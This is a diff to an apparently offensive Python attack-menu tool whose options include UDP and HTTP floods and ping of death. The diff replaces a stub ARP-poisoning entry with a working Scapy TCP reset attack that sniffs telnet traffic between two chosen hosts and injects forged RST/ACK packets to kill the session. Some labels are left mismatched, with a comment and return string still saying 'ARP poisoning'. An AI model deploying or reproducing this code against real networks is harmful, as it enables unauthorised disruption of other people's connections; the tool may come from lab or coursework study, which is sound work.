@@ -21,7 +21,7 @@ def attack_to_perform(number):
         13: perform_udp_flood_attack,  # udp flood attack (?)
         14: perform_http_flood_attack,  # http flood attack (?)
         15: perform_ping_of_death,  # ping of death (ok)
-        16: perform_arp_poisoning,  # arp poisoning (to implement)
+        16: perform_tcp_rst_on_telnet,  # arp poisoning (to implement)
         17: perform_special_attack,  # special attack
     }
 
@@ -49,7 +49,7 @@ def print_attack_menu():
     print("(13) UDP Flood Attack")
     print("(14) HTTP Flood Attack")
     print("(15) Ping of Death")
-    print("(16) ARP Poisoning")
+    print("(16) TCP RST on Telnet")
     print("(17) Special Attack")
     print("-----------------------------------------------------")
     print()
@@ -435,13 +435,34 @@ def perform_ping_of_death(ip_addr=None):
     return "Ping of death attack performed on " + ip_addr
 
 
-# (16) Code to perform ARP poisoning
-def perform_arp_poisoning(ip_addr=None):
-    if not ip_addr:
-        # Get input from the user
-        ip_addr = input("Enter the IP address to scan: ")
+# (16) Code to perform TCP reset attack on telnet
+def perform_tcp_rst_on_telnet():
+    print("Telnet Reset\n")
+    host1 = input("Enter the IP address to attack (the one who requested the telnet): ")
+    host2 = input("Enter the IP address of the target of Telnet: ")
+    interface = "eth0"
+    dstPORT = 23
 
-    return "ARP poisoning performed on " + ip_addr
+    def do_rst(pkt):
+        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+        tcp = TCP(
+            sport=pkt[TCP].dport,
+            dport=pkt[TCP].sport,
+            flags=0x14,
+            seq=pkt[TCP].ack,
+            ack=pkt[TCP].seq + 1,
+        )  # 0x14 = 20 --> RST/ACK
+        pkt = ip / tcp
+        # ls(pkt)
+        send(pkt, verbose=0)
+
+    sniff(
+        iface=interface,
+        filter="host " + host1 + " and host " + host2 + " and port " + str(dstPORT),
+        prn=do_rst,
+    )
+
+    return "ARP poisoning performed on " + host1
 
 
 # (17) Code to perform Special attack
